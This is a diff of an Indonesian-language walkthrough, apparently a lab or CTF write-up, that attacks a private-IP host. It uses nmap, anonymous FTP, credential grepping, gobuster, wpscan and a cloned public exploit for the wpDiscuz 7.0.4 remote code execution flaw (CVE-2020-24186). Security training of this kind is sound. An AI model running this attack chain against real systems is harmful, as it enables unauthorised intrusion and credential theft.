@@ -35,7 +35,7 @@ nmap -p- 10.15.42.245
 Pindai kerentanan FTP dengan Nmap:
 
 ```bash
-nmap --script=ftp-anon,ftp-vsftpd-backdoor -p21 10.15.42.245
+gobuster dir --url http://10.15.42.245:487 --wordlist /usr/share/wordlists/dirb/common.txt
 ```
 ![langkah 2](https://github.com/user-attachments/assets/e1622ada-0dc9-4a72-b402-35f5904e8fd5)
 
@@ -45,17 +45,14 @@ Login ke FTP menggunakan akun anonymous:
 ```bash
 ftp 10.15.42.245
 ```
-![langkah 3](https://github.com/user-attachments/assets/ddb6a8dd-5e9e-4240-966f-124bf9380e0a)
-
-
-Download file yang ditemukan:
 
 ```bash
 ls
 get list.xyz
 get readme.txt
 ```
-![langkah 4](https://github.com/user-attachments/assets/af24be7f-4219-40a3-8dd3-0d9b06e7c6e8)
+
+![langkah 3](https://github.com/user-attachments/assets/ddb6a8dd-5e9e-4240-966f-124bf9380e0a)
 
 
 Mencari username atau password dalam file:
@@ -64,21 +61,18 @@ Mencari username atau password dalam file:
 cat list.xyz
 grep -i "ethack" list.xyz
 ```
+
+![langkah 4](https://github.com/user-attachments/assets/af24be7f-4219-40a3-8dd3-0d9b06e7c6e8)
+
+Masukkan password pada hashesntxt
+
+```bash
+nano hashes.txt
+```
+
 ![langkah 5](https://github.com/user-attachments/assets/70d6be57-2b69-45ee-a9f4-4fbfed67d89c)
 
 
-Simpan hash dan crack dengan John the Ripper:
-
-```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-```
-
-Vulnerable WordPress Plugin:
-Gunakan GoBuster untuk mencari direktori tersembunyi:
-
-```bash
-gobuster dir --url http://10.15.42.245:487 --wordlist /usr/share/wordlists/dirb/common.txt
-```
 
 Gunakan wpscan untuk mendeteksi plugin WordPress yang terinstal:
 
@@ -98,6 +92,10 @@ git clone https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE
 ![langkah 8](https://github.com/user-attachments/assets/ce1f2b97-1a83-4b2e-a69e-c977bfb87140)
 
 Jalankan exploit:
+
+```bash
+cd CVE-2020-24186-wpDiscuz-7.0.4-RCE
+```
 
 ```bash
 sudo python3 wpDiscuz_RemoteCodeExec.py -u http://10.15.42.245:487 -p /2024/10/03/trial/
